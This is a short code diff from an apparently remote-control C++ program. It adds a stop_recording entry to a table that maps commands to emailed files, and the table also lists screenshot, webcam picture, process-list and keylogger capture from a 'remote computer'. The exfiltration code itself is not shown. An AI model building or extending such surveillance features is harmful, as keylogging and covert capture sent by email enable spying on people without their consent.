@@ -50,18 +50,20 @@ SOCKET connect_to_server(const std::string& host, int port) {
 static std::atomic<bool> running(true);
 
 // Mapping command với email subject và file name
-std::map<std::string, std::pair<std::string, std::string>> fileCommands = {
-    {"get_screenshot", {"Screenshot from remote computer", "screenshot.png"}},
-    {"get_picture", {"Picture from remote computer", "picture.png"}},
-    {"list_program",
-     {"Running programs from remote computer", "running_programs.txt"}},
-    {"list_process",
-     {"Process list from remote computer", "processes_with_pid.txt"}},
-    {"list_installed",
-     {"Installed programs from remote computer", "installed_programs.txt"}},
-    {"start_recording",
-     {"Video recording from remote computer", "recording.avi"}},
-    {"keylogger", {"Keylogger log from remote computer", "keylog.txt"}}};
+  std::map<std::string, std::pair<std::string, std::string>> fileCommands = {
+      {"get_screenshot", {"Screenshot from remote computer", "screenshot.png"}},
+      {"get_picture", {"Picture from remote computer", "picture.png"}},
+      {"list_program",
+      {"Running programs from remote computer", "running_programs.txt"}},
+      {"list_process",
+      {"Process list from remote computer", "processes_with_pid.txt"}},
+      {"list_installed",
+      {"Installed programs from remote computer", "installed_programs.txt"}},
+      {"start_recording",
+      {"Video recording from remote computer", "recording.avi"}},
+      {"keylogger", {"Keylogger log from remote computer", "keylog.txt"}},
+      {"stop_recording",
+      {"Video recording from remote computer", "recording.avi"}}};
 
 void signal_handler(int) { running.store(false); }
 
